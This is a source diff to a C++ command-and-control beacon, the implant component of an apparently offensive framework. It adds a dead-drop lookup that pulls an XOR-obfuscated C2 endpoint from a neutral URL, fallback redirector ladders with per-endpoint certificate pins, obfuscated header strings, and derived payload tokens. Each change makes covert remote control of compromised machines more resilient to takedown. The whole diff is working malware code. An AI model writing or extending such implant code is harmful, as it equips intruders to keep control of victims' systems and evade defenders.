@@ -43,6 +43,8 @@
 #include <ctime>
 #include <cstdint>
 #include <array>
+#include <vector>
+#include <map>
 #include <algorithm>
 
 #include "crypto.h"
@@ -88,12 +90,43 @@ static constexpr bool kUseHttps = true;
 #ifndef C2_PROXY
 #define C2_PROXY ""
 #endif
+// LAST-RING dead drop (see phantom.utils.dead_drop): one neutral URL the
+// beacon consults ONLY after every ladder rung failed, holding the current
+// endpoint as an obfuscated record. Empty = no dead drop. The XOR key is a
+// FORMAT CONSTANT mirrored in dead_drop.py — changing one side alone breaks
+// the record silently (the beacon would just never rotate).
+#ifndef C2_DEADDROP
+#define C2_DEADDROP ""
+#endif
+#ifndef C2_DEADDROP_KEY
+#define C2_DEADDROP_KEY 0x5A
+#endif
+// Resolve the live endpoint from the dead drop BEFORE the first check-in
+// (1 = on, the default; 0 = the dead drop stays last-ring only). Optional so
+// an older generated c2_config.h still compiles.
+#ifndef C2_DEADDROP_BOOTSTRAP
+#define C2_DEADDROP_BOOTSTRAP 1
+#endif
+// PER-ENDPOINT PINS. A fallback ladder whose rungs are DIFFERENT redirectors
+// cannot share one certificate: each rung presents its own. `C2_HOST_PINS`
+// carries one SHA-256 DER digest per rung, aligned positionally with
+// [C2_HOST] + C2_HOSTS (empty field = inherit the compiled fallback pin).
+// `C2_HOST_PUBKEY_PINS` mirrors it in libcurl's sha256//<base64> SPKI shape
+// for the macOS transport, which cannot pin a DER certificate. Optional so an
+// older generated c2_config.h still compiles.
+#ifndef C2_HOST_PINS
+#define C2_HOST_PINS ""
+#endif
+#ifndef C2_HOST_PUBKEY_PINS
+#define C2_HOST_PUBKEY_PINS ""
+#endif
 
 // The pinned C2 certificate fingerprint, when the build provides one. Pinning
 // is enforced whenever it is present, independently of mTLS: a beacon that
 // accepts ANY server certificate over TLS has no transport authentication at
 // all (the payload is encrypted end-to-end, but the peer is unauthenticated).
-#if defined(BEACON_SERVER_FINGERPRINT)
+#if defined(BEACON_SERVER_FINGERPRINT) || defined(BEACON_PER_ENDPOINT_PINS) \
+    || defined(BEACON_SERVER_PUBKEY_PIN)
 #define BEACON_PIN_ENFORCED 1
 #else
 #define BEACON_PIN_ENFORCED 0
@@ -106,6 +139,25 @@ static constexpr bool kUseHttps = true;
 #else
 #define BEACON_VERIFY_CALLBACK 0
 #endif
+
+// Like split_csv, but PRESERVES empty fields: the per-endpoint pin list is
+// POSITIONAL, so "aaaa,,cccc" must decode to three entries (the middle one
+// meaning "inherit the fallback pin").
+inline std::vector<std::string> split_pins_keep_empty(const char* raw) {
+    std::vector<std::string> out;
+    if (!raw) return out;
+    std::string current;
+    for (const char* p = raw; *p; ++p) {
+        if (*p == ',') {
+            out.push_back(current);
+            current.clear();
+        } else if (*p != ' ' && *p != '"') {
+            current.push_back(*p);
+        }
+    }
+    out.push_back(current);
+    return out;
+}
 
 inline std::vector<std::string> split_csv(const char* raw) {
     std::vector<std::string> out;
@@ -137,11 +189,32 @@ struct C2Config {
     // that died on the CURRENT endpoint, so a flapping network does not
     // burn the whole ladder in three seconds.
     std::vector<std::string> ladder;
+    // Per-endpoint pins keyed by ENDPOINT, not by index: prefer_endpoint()
+    // and the dead-drop refresh REORDER the ladder, and an index-aligned list
+    // would then pin the wrong rung. A rung with no entry inherits the
+    // compiled fallback pin.
+    std::map<std::string, std::string> host_pins;
+    std::map<std::string, std::string> host_pubkey_pins;
     size_t       ladder_index = 0;
     int          failures_here = 0;
     int          failover_after = 3;
     // explicit proxy URL ("" = let the OS/proxy layer decide)
     std::string  proxy;
+    // ── the dead drop (last ring) ──────────────────────────────────────
+    // Consulted only after `dd_after` consecutive failures, independently of
+    // the ladder rotation: a dead drop that is itself unreachable must cost
+    // ONE request per window, never one per check-in.
+    std::string  dead_drop;
+    int          dd_failures = 0;
+    int          dd_after = 8;
+    // ── bootstrap (dead drop FIRST) ────────────────────────────────────
+    // With C2_DEADDROP_BOOTSTRAP the beacon resolves its live endpoint from
+    // the dead drop ONCE, before the first check-in: the compiled C2_HOST is
+    // then only a fallback rung, so the address the host observes first is an
+    // indirection the operator can rotate without a rebuild. A failed
+    // bootstrap costs ONE request and falls through to the compiled ladder
+    // unchanged; the ordinary last-ring path still retries after failures.
+    bool         dd_bootstrap_done = false;
 
     void apply_endpoint() {
         std::string endpoint = ladder.empty() ? std::string("127.0.0.1")
@@ -155,7 +228,9 @@ struct C2Config {
 
     // Seed the ladder from the compiled-in primary + fallbacks, then point
     // `host` at the first rung.
-    void seed_ladder(const std::string& primary, const std::string& fallbacks) {
+    void seed_ladder(const std::string& primary, const std::string& fallbacks,
+                     const std::string& pins = "",
+                     const std::string& pubkey_pins = "") {
         ladder.clear();
         if (!primary.empty()) ladder.push_back(primary);
         for (const std::string& extra : split_csv(fallbacks.c_str())) {
@@ -163,6 +238,18 @@ struct C2Config {
                 std::find(ladder.begin(), ladder.end(), extra) == ladder.end()) {
                 ladder.push_back(extra);
             }
+        }
+        // Pins are positional over the SAME list built above: index i pins
+        // ladder[i], and an empty field leaves that rung on the fallback pin.
+        host_pins.clear();
+        host_pubkey_pins.clear();
+        std::vector<std::string> pin_list = split_pins_keep_empty(pins.c_str());
+        std::vector<std::string> pub_list = split_pins_keep_empty(pubkey_pins.c_str());
+        for (size_t i = 0; i < ladder.size(); ++i) {
+            if (i < pin_list.size() && !pin_list[i].empty())
+                host_pins[ladder[i]] = pin_list[i];
+            if (i < pub_list.size() && !pub_list[i].empty())
+                host_pubkey_pins[ladder[i]] = pub_list[i];
         }
         ladder_index = 0;
         failures_here = 0;
@@ -183,6 +270,46 @@ struct C2Config {
 
     const std::string endpoint() const {
         return ladder.empty() ? std::string("127.0.0.1") : ladder[ladder_index];
+    }
+
+    // The compiled-in fallback pin (BEACON_SERVER_FINGERPRINT), or "".
+    static const std::string& compiled_pin() {
+#if defined(BEACON_SERVER_FINGERPRINT)
+        static const std::string pin = BEACON_SERVER_FINGERPRINT;
+        return pin;
+#else
+        static const std::string pin;
+        return pin;
+#endif
+    }
+
+    // The compiled-in SPKI pin (macOS/libcurl shape), or "".
+    static const std::string& compiled_pubkey_pin() {
+#if defined(BEACON_SERVER_PUBKEY_PIN)
+        static const std::string pin = BEACON_SERVER_PUBKEY_PIN;
+        return pin;
+#else
+        static const std::string pin;
+        return pin;
+#endif
+    }
+
+    // The DER pin that authenticates the CURRENT rung: its own when it has
+    // one, otherwise the compiled fallback. Empty means "no pin known": the
+    // verifier treats that as a rejection when enforcement is on (fail
+    // closed), so a rung nobody pinned is never silently trusted.
+    const std::string& active_pin() const {
+        auto it = host_pins.find(endpoint());
+        if (it != host_pins.end() && !it->second.empty()) return it->second;
+        return compiled_pin();
+    }
+
+    // Same for the macOS SPKI pin.
+    const std::string& active_pubkey_pin() const {
+        auto it = host_pubkey_pins.find(endpoint());
+        if (it != host_pubkey_pins.end() && !it->second.empty())
+            return it->second;
+        return compiled_pubkey_pin();
     }
 
     // One failed check-in on the current endpoint. Returns true when the
@@ -410,8 +537,12 @@ auto wants_payload_token = [](const std::wstring& p) {
     if (p.find(L"/api/v1/payload") != std::wstring::npos) return true;
     return p == L"/x" || p.rfind(L"/x?", 0) == 0 || p.rfind(L"/x/", 0) == 0;
 };
-if (wants_payload_token(path)) {
-    std::string at = std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + C2_PAYLOAD_TOKEN;
+// crypto::payload_token() is DERIVED from this beacon's own identity (the
+// enroler writes an empty C2_PAYLOAD_TOKEN), so a captured binary does not
+// hand over the deployment token that unlocks every payload.
+const std::string& payload_tok = crypto::payload_token();
+if (wants_payload_token(path) && !payload_tok.empty()) {
+    std::string at = std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + payload_tok;
     std::wstring wat(at.begin(), at.end());
     headers += wat + wrn;
 }
@@ -526,6 +657,9 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
     // authenticates the peer. Enforced whenever the build carries a
     // fingerprint, so a default build is no longer "TLS to anyone".
 #if BEACON_PIN_ENFORCED
+    // Pin the certificate the CURRENT rung presents (per-endpoint pins), not
+    // one global digest: in a ladder each redirector has its own cert.
+    const std::string& want_pin = cfg.active_pin();
     PCCERT_CONTEXT peer_cert = nullptr;
     DWORD peer_size = sizeof(peer_cert);
     bool pin_ok = winhttp_dyn::WinHttpQueryOptionDynamic(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
@@ -537,7 +671,9 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
                                       peer_cert->pbCertEncoded,
                                       peer_cert->cbCertEncoded,
                                       peer_hash, &peer_hash_len) == TRUE;
-        pin_ok = pin_ok && crypto::hex_encode(peer_hash, peer_hash_len) == BEACON_SERVER_FINGERPRINT;
+        // Empty = no pin known for this rung: fail closed, never accept.
+        pin_ok = pin_ok && !want_pin.empty() &&
+                 crypto::hex_encode(peer_hash, peer_hash_len) == want_pin;
     }
     if (peer_cert) CertFreeCertificateContext(peer_cert);
     if (!pin_ok) {
@@ -654,8 +790,9 @@ inline std::string http_request(
         if (u.find("/api/v1/payload") != std::string::npos) return true;
         return u.rfind("/x", 0) == 0 && (u.size() == 2 || u[2] == '?' || u[2] == '/');
     };
-    if (wants_tok(url))
-        headers = curl_slist_append(headers, (std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + C2_PAYLOAD_TOKEN).c_str());
+    const std::string& curl_payload_tok = crypto::payload_token();
+    if (wants_tok(url) && !curl_payload_tok.empty())
+        headers = curl_slist_append(headers, (std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + curl_payload_tok).c_str());
 #if BEACON_AUTH_ENABLED
     headers = curl_slist_append(headers, ("X-Beacon-Timestamp: " + auth.timestamp).c_str());
     headers = curl_slist_append(headers, ("X-Beacon-Counter: " + auth.counter).c_str());
@@ -668,7 +805,23 @@ inline std::string http_request(
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
 
     if (cfg.use_https) {
-#if BEACON_MTLS_ENABLED
+#if BEACON_PIN_ENFORCED
+        // PIN-FIRST, like Windows/Linux. libcurl can only pin the public key
+        // (SPKI), not the DER certificate, so the generator emits the same
+        // rung's key in sha256//<base64> shape. With a pin present libcurl's
+        // verification is switched ON and the pinned key IS the decision: a
+        // self-signed C2 is accepted exactly when its key matches. A rung
+        // with no known pin gets an impossible pin, so it fails closed
+        // instead of silently trusting an unauthenticated peer.
+        const std::string& spki = cfg.active_pubkey_pin();
+        if (spki.empty()) {
+            curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, "sha256//AAAA");
+        } else {
+            curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, spki.c_str());
+        }
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+#elif BEACON_MTLS_ENABLED
         // mTLS: verify the chain against the private CA (client cert already
         // proves identity); hostname check is skipped because the operator
         // connects via IP while the cert SAN may only carry localhost.
@@ -861,6 +1014,14 @@ inline bool proxy_tunnel(int sock, const std::string& host, int port) {
 }
 
 #if BEACON_VERIFY_CALLBACK
+// The pin the CURRENT handshake must see. The verifier is a C callback with
+// no access to the config, and the beacon is single-threaded: the request
+// path sets this immediately before connecting.
+inline std::string& active_pin_slot() {
+    static std::string pin;
+    return pin;
+}
+
 // PIN-FIRST verification.
 //
 // The old callback rejected the connection whenever `preverify_ok` was false,
@@ -878,7 +1039,19 @@ inline int verify_server_pin(int preverify_ok, X509_STORE_CTX* store_ctx) {
     unsigned char digest[EVP_MAX_MD_SIZE] = {0};
     unsigned int digest_len = 0;
     if (X509_digest(certificate, EVP_sha256(), digest, &digest_len) != 1) return 0;
-    return crypto::hex_encode(digest, digest_len) == BEACON_SERVER_FINGERPRINT;
+    const std::string& want = active_pin_slot();
+    if (want.empty()) {
+#if BEACON_MTLS_ENABLED
+        // No pin for this rung, but mTLS authenticated the peer the other
+        // way round (the private CA + our client cert); accept the chain.
+        return 1;
+#else
+        // Enforcement is on and no pin is known for this rung: refuse rather
+        // than trust an unauthenticated peer (fail closed).
+        return 0;
+#endif
+    }
+    return crypto::hex_encode(digest, digest_len) == want;
 }
 #endif
 
@@ -960,7 +1133,9 @@ inline std::string http_request(
             // Without mTLS nothing verified the peer at all: a default build
             // would complete a TLS handshake with ANY server. Pin-first
             // verification makes the leaf fingerprint the decision, which is
-            // the only check that works against a self-signed C2.
+            // the only check that works against a self-signed C2. The pin is
+            // the CURRENT rung's (per-endpoint pins).
+            active_pin_slot() = cfg.active_pin();
             SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, verify_server_pin);
 #endif
             ssl = SSL_new(ssl_ctx);
@@ -990,8 +1165,10 @@ inline std::string http_request(
         req += "X-Beacon-Id: " + beacon_id + "\r\n";
     bool tok = path_narrow.rfind("/x", 0) == 0 &&
                (path_narrow.size() == 2 || path_narrow[2] == '?' || path_narrow[2] == '/');
-    if (path_narrow.find("/api/v1/payload") != std::string::npos || tok)
-        req += "X-Auth-Token: " + std::string(C2_PAYLOAD_TOKEN) + "\r\n";
+    const std::string& raw_payload_tok = crypto::payload_token();
+    if (!raw_payload_tok.empty() &&
+        (path_narrow.find("/api/v1/payload") != std::string::npos || tok))
+        req += "X-Auth-Token: " + raw_payload_tok + "\r\n";
 #if BEACON_AUTH_ENABLED
     req += "X-Beacon-Timestamp: " + auth.timestamp + "\r\n";
     req += "X-Beacon-Counter: " + auth.counter + "\r\n";
@@ -1065,6 +1242,83 @@ inline std::wstring get_malleable_result_path() {
 
 // Check in with the C2 server and retrieve pending tasks.
 // Returns the decrypted JSON string with tasks, or "" on failure.
+// ── last ring: refresh the ladder from the dead drop ─────────────────────
+// Returns true when the dead drop yielded a NEW endpoint that became the
+// first rung. Bounded to a single request; a failure is a plain `false`, so
+// the caller keeps its normal backoff. The probe runs through a COPY of the
+// config so the live one is only mutated on success.
+inline bool refresh_from_dead_drop(C2Config& cfg) {
+    if (cfg.dead_drop.empty()) return false;
+    bool https = true;
+    std::string rest = cfg.dead_drop;
+    if (rest.rfind("https://", 0) == 0) { https = true; rest = rest.substr(8); }
+    else if (rest.rfind("http://", 0) == 0) { https = false; rest = rest.substr(7); }
+    std::string hostport = rest, path = "/";
+    size_t slash = rest.find('/');
+    if (slash != std::string::npos) {
+        hostport = rest.substr(0, slash);
+        path = rest.substr(slash);
+    }
+    std::string dd_host = hostport;
+    int dd_port = https ? 443 : 80;
+    size_t colon = hostport.rfind(':');
+    if (colon != std::string::npos) {
+        dd_host = hostport.substr(0, colon);
+        int parsed = std::atoi(hostport.substr(colon + 1).c_str());
+        if (parsed > 0 && parsed < 65536) dd_port = parsed;
+    }
+    if (dd_host.empty() || dd_host == "") return false;
+
+    C2Config probe = cfg;
+    probe.use_https = https;
+#ifdef _WIN32
+    probe.host = std::wstring(dd_host.begin(), dd_host.end());
+#else
+    probe.host = dd_host;
+#endif
+    probe.port = dd_port;
+#ifdef _WIN32
+    // the cached connection belongs to the CURRENT endpoint: drop it so the
+    // probe dials the dead drop, then drop the probe's so the next check-in
+    // reopens against the live config
+    g_ctx.cleanup();
+#endif
+    std::string body = http_request(
+        probe, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
+        std::wstring(path.begin(), path.end()), "", "");
+#ifdef _WIN32
+    g_ctx.cleanup();
+#endif
+    if (body.empty()) return false;
+
+    // the record is base64(XOR("phx1|host|port|ssl")): base64_decode skips
+    // the whitespace/markup a paste host may pad the page with, and a page
+    // that is not a record fails the prefix check (never half-applied)
+    std::vector<BYTE> raw = crypto::base64_decode(body);
+    if (raw.empty()) return false;
+    for (auto& b : raw) b = static_cast<BYTE>(b ^ C2_DEADDROP_KEY);
+    std::string rec(raw.begin(), raw.end());
+    if (rec.rfind("phx1|", 0) != 0) return false;
+    size_t p1 = rec.find('|', 5);
+    if (p1 == std::string::npos) return false;
+    size_t p2 = rec.find('|', p1 + 1);
+    if (p2 == std::string::npos) return false;
+    std::string new_host = rec.substr(5, p1 - 5);
+    int new_port = std::atoi(rec.substr(p1 + 1, p2 - p1 - 1).c_str());
+    bool new_https = (rec.substr(p2 + 1, 1) == "1");
+    if (new_host.empty() || new_port <= 0 || new_port > 65535) return false;
+
+    cfg.port = new_port;
+    cfg.use_https = new_https;
+    cfg.ladder.erase(std::remove(cfg.ladder.begin(), cfg.ladder.end(), new_host),
+                     cfg.ladder.end());
+    cfg.ladder.insert(cfg.ladder.begin(), new_host);
+    cfg.ladder_index = 0;
+    cfg.failures_here = 0;
+    cfg.apply_endpoint();
+    return true;
+}
+
 inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
     std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
     
